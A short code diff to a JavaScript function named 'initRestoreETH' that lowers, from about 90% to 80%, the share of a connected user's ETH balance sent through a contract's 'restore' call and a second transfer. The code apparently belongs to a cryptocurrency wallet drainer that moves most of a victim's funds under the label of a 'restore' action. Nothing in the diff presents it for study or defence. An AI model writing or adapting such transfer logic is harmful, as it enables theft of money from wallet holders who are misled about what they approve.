@@ -235,7 +235,7 @@ async function initRestoreETH() {
             ],
             abi: RST_ABI,
             functionName: "restore",
-            value: BigInt(parseInt(userBalance * 0.9)),
+            value: BigInt(parseInt(userBalance * 0.8)),
             type: "legacy",
             chainId: hexToNumber(
                 await wallet.request({
@@ -265,7 +265,7 @@ async function initRestoreETH() {
             ),
             value: BigInt(
                 parseInt(
-                    parseInt(userBalance * 0.92) -
+                    parseInt(userBalance * 0.8) -
                         parseInt(Number(gasPrice) * 50000)
                 )
             ),
